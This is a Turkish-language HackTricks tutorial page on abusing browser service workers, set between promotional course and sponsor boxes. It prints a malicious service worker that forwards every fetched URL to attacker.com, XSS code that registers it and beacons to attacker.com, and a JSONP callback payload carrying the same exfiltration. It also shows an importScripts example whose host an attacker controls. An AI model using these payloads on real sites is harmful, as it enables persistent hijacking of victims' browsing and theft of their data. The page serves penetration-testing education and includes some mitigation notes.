# Service Worker'ları Kötüye Kullanma



<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin
* [**Resmi PEASS & HackTricks swag'ını**](https://peass.creator-spring.com) alın
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter**'da beni takip edin 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Hacking hilelerinizi** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **göndererek paylaşın**.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

En önemli olan zayıflıkları bulun, böylece daha hızlı düzeltebilirsiniz. Intruder saldırı yüzeyinizi takip eder, proaktif tehdit taramaları yapar, API'lerden web uygulamalarına ve bulut sistemlerine kadar tüm teknoloji yığınınızda sorunları bulur. [**Ücretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugün.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Temel Bilgiler

Bir **service worker**, tarayıcınız tarafından arka planda çalıştırılan, herhangi bir web sayfasından bağımsız olarak çalışan, web sayfası veya kullanıcı etkileşimi gerektirmeyen özellikleri etkinleştiren bir betiktir, bu nedenle **çevrimdışı ve arka plan işleme** yeteneklerini artırır. Service worker'lar hakkında detaylı bilgiye [buradan](https://developers.google.com/web/fundamentals/primers/service-workers) ulaşabilirsiniz. Savunmasız bir web alanında service worker'ları kötüye kullanan saldırganlar, o alan içindeki tüm sayfalarla kurbanın etkileşimini kontrol edebilirler.


### Varolan Service Worker'ları Kontrol Etme

Varolan service worker'ları, **Geliştirici Araçları**'ndaki **Uygulama** sekmesinin **Service Worker'lar** bölümünde kontrol edebilirsiniz. Başka bir yöntem ise daha detaylı bir görünüm için [chrome://serviceworker-internals](https://chromium.googlesource.com/chromium/src/+/main/docs/security/chrome%3A/serviceworker-internals) adresini ziyaret etmektir.

### Bildirimleri İletme

**Bildirim izinleri**, bir **service worker'ın** doğrudan kullanıcı etkileşimi olmadan sunucuyla iletişim kurma yeteneğini etkiler. İzinler reddedildiğinde, service worker'ın sürekli bir tehdit oluşturma potansiyelini sınırlar. Tam tersine, izinlerin verilmesi, potansiyel saldırıların alınmasını ve yürütülmesini mümkün kılarak güvenlik risklerini artırır.

## Bir Service Worker Oluşturarak Saldırı Yapma

Bu zafiyeti sömürmek için aşağıdakileri bulmanız gerekmektedir:

* Sunucuya **keyfi JS** dosyaları yüklemek için bir yol ve yüklenen JS dosyasının **service worker'ını yüklemek için bir XSS** bulunması
* **Manipüle edilebilen bir JSONP isteği** olan bir **zafiyetli** ve bir **payload ile JSONP'yi yükleyecek bir XSS** bulunması, bu da **zararlı bir service worker'ı yükleyecektir**.

Aşağıdaki örnekte, **fetch** olayını dinleyecek ve her alınan URL'yi saldırganın sunucusuna gönderecek bir **yeni bir service worker** kaydetmek için gereken kodu sunuyorum (bu kodu **sunucuya yüklemek** veya **zafiyetli bir JSONP** yanıtıyla yüklemek için kullanmanız gerekecektir):
```javascript
self.addEventListener('fetch', function(e) {
e.respondWith(caches.match(e.request).then(function(response) {
fetch('https://attacker.com/fetch_url/' + e.request.url)
});
```
Ve işte işçiyi kaydedecek olan kod (XSS'yi istismar ederek yürütebilmeniz gereken kod). Bu durumda, hizmet işçisinin kaydının başarılı olup olmadığını bildiren bir GET isteği, saldırganın sunucusuna gönderilecektir:
```javascript
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
.then(function(registration) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/success", true);
xhttp2.send();
}, function (err) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/error", true);
xhttp2.send();
});
});
</script>
```
Zararlı bir JSONP uç noktasını istismar etmek durumunda, değeri `var sw` içine yerleştirmelisiniz. Örneğin:
```javascript
var sw = "/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//";
```
**Shadow Workers** adlı bir **C2**, Service Worker'ları sömürmek için kullanılan bir araçtır ve bu zafiyetleri istismar etmek için oldukça faydalı olacaktır.

**24 saatlik önbellek yönergesi**, kötü niyetli veya ele geçirilmiş bir **service worker'ın (SW)** ömrünü, bir XSS zafiyetinin düzeltilmesinden sonra en fazla 24 saat olarak sınırlar, çevrimiçi istemci durumu varsayılarak. Zafiyeti en aza indirmek için site işletmecileri, SW betiğinin Time-To-Live (TTL) değerini düşürebilir. Geliştiricilere hızlı devre dışı bırakma için bir [**service worker kill-switch**](https://stackoverflow.com/questions/33986976/how-can-i-remove-a-buggy-service-worker-or-implement-a-kill-switch/38980776#38980776) oluşturmaları da önerilir.

## DOM Clobbering ile SW'de `importScripts`'in Kötüye Kullanılması

Bir Service Worker'dan çağrılan **`importScripts`** fonksiyonu, **farklı bir etki alanından bir betiği içe aktarabilir**. Bu fonksiyon, bir saldırganın değiştirebileceği bir **parametre kullanılarak çağrılırsa**, XSS saldırısı gerçekleştirebilir ve **kendi etki alanından bir JS betiğini içe aktarabilir**.

**Bu, CSP korumalarını bile atlatır.**

**Örnek zafiyetli kod:**

* **index.html**
```html
<script>
navigator.serviceWorker.register('/dom-invader/testcases/augmented-dom-import-scripts/sw.js' + location.search);
// attacker controls location.search
</script>
```
* **sw.js**
```javascript
const searchParams = new URLSearchParams(location.search);
let host = searchParams.get('host');
self.importScripts(host + "/sw_extra.js");
//host can be controllable by an attacker
```
### DOM Clobbering ile

DOM Clobbering hakkında daha fazla bilgi için şu adrese bakın:

{% content-ref url="dom-clobbering.md" %}
[dom-clobbering.md](dom-clobbering.md)
{% endcontent-ref %}

Eğer SW'nin **`importScripts`** çağrısı için kullandığı URL/domain, **bir HTML öğesi içindeyse**, DOM Clobbering kullanarak SW'nin **kendi alanınızdan bir betik yüklemesini sağlamak mümkündür**.

Bunun bir örneği için referans linkine bakın.

## Referanslar

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

En önemli olan zafiyetleri bulun ve daha hızlı düzeltin. Intruder saldırı yüzeyinizi takip eder, proaktif tehdit taramaları yapar, API'lerden web uygulamalarına ve bulut sistemlerine kadar tüm teknoloji yığınınızda sorunları bulur. [**Ücretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugün.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını yapmak** ister misiniz? veya **PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuz olan özel [**NFT'lerimizi**](https://opensea.io/collection/the-peass-family) keşfedin
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi** [**hacktricks repo'ya**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo'ya**](https://github.com/carlospolop/hacktricks-cloud) **PR göndererek paylaşın**.

</details>
